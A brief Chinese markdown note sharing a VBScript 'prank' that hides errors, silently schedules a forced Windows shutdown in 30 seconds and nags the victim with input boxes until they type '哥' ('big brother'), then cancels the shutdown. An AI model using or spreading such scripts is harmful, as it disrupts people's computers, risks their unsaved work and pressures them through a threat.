# vbs实例

- 恶搞代码1

```
on error resume next

dim ws
set ws = createobject("wscript.shell")
ws.run "cmd.exe /c shutdown -s -t 30",0,true
msgbox "快快快,叫哥，给你30秒，不然后果自负奥",0,"hi，小吴同学"

dim t
do while(t <> "哥")
t = inputbox("时间不多啦！想好了再说哈","叫不叫","不叫",8000,7000)
if(t <> "哥") then
msgbox "再给你一次机会，你再好好想想",0,"to小吴同学"
end if
loop
msgbox "这才对嘛，早点叫不就好啦",0,"to小吴同学"

dim ws1
set ws1 = createobject("wscript.shell")
ws1.run "cmd.exe /c shutdown -a",0,true
```
